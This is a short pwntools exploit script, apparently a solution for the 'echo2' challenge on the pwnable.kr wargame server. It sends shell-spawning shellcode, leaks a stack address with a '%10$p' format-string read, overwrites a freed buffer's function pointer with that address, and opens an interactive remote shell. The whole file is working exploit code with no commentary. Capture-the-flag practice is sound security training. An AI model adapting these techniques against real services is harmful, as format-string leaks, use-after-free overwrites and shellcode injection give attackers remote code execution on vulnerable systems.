from pwn import *

context.arch='amd64'

###Util
def echo2(data):
    r.sendlineafter('> ','2')
    r.sendline(data)
    r.recvline()
    return r.recvline()[2:-1]

def echo3(data):
    r.sendlineafter('> ','3')
    r.sendline(data)

def delete():
    r.sendlineafter('> ','4')
    r.sendlineafter('(y/n)','n')

def getshell():
    r.sendlineafter('> ','3')

###Exploit
r = remote('pwnable.kr',9011)

shellcode = asm(shellcraft.sh())
r.sendlineafter(' : ',shellcode)

buf = int(echo2('%10$p'),16)-0x20
delete()
echo3(b'a'*0x18+p64(buf))

getshell()
r.interactive()

